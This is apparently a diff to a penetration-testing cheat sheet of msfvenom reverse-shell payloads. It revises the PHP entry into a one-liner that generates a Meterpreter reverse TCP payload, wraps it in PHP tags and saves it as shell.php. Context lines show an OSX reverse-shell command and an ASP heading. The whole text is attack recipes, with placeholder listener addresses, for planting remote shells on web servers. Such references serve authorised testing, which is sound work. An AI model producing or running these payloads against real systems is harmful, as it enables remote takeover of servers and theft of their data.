@@ -225,8 +225,7 @@ msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port t
 ----------------------------------------------------------------------------------------------------------------------
 **PHP**
 
-msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php
-cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
+msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php && echo '<?php ' | cat - shell.php > temp && mv temp shell.php && echo '?>' >> shell.php
 
 **ASP**
 
